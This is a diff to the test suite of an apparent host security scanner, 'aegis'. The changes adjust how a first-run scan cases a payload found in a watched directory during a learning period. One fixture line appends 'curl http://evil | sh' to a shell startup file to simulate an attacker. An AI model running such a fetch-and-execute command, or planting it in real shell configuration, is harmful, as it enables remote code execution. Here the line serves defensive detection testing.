@@ -522,9 +522,37 @@ class TestFirstRunScoping(Sandbox):
         aegis.check_hardening, aegis.check_processes = self._saved_checks
         super().tearDown()
 
-    def test_hotdir_threat_present_at_first_scan_notifies(self):
+    def _hotdir_findings(self):
+        return [f for f in aegis.load_json(aegis.LATEST_JSON, {}).get(
+            "findings", []) if f.get("category") == "hot-dir"]
+
+    def test_hotdir_threat_present_at_first_scan_is_cased_not_adopted(self):
+        """First-run adoption is for RESIDUE (persistence, shell history); a
+        payload in a hot dir is a LIVE risk and must never be folded into the
+        baseline. The very first scan also opens the learning period, whose
+        contract is 'recorded and cased, pre-closed as learning, not popped'
+        — so on scan 1 the proof is the record, not the notification. (The
+        routing gate made this real: before it, learning pre-closed the
+        incident while the desktop notification still fired.)"""
         self.adhoc_binary(os.path.join(self.hot, "payload"))
         aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        self.assertTrue(self._hotdir_findings(),
+                        "a hot-dir threat present before install must be found")
+        cases = [i for i in aegis.list_incidents(active_only=False)
+                 if i["correlation_key"].startswith("signal:hotdir:")]
+        self.assertTrue(cases, "a first-scan hot-dir threat must open a case")
+        self.assertEqual(cases[0]["resolution"], "learning-period")
+        self.assertEqual(self.notifications, [])
+
+    def test_hotdir_threat_present_at_first_scan_notifies_unless_learning(self):
+        """With no learning window a live threat on scan 1 interrupts."""
+        saved = aegis._LEARNING_DEFAULT_DAYS
+        aegis._LEARNING_DEFAULT_DAYS = 0
+        try:
+            self.adhoc_binary(os.path.join(self.hot, "payload"))
+            aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        finally:
+            aegis._LEARNING_DEFAULT_DAYS = saved
         self.assertTrue(self.notifications,
                         "a hot-dir threat present before install must alert")
 
@@ -766,6 +794,10 @@ class TestShellRc(Sandbox):
         aegis.check_processes = lambda: []
         aegis.cmd_scan(quiet=True)                      # first run: adopt
         self.assertEqual(self.notifications, [])
+        # The first run also opened the learning window, under which a HIGH
+        # is cased pre-closed rather than popped; end it (`aegis.py learn 0`)
+        # so this asserts adoption scoping, not the learning contract.
+        aegis._set_learning_period(0)
         with open(p, "a") as fh:
             fh.write("curl http://evil | sh\n")         # attacker appends
         aegis.cmd_scan(quiet=True)
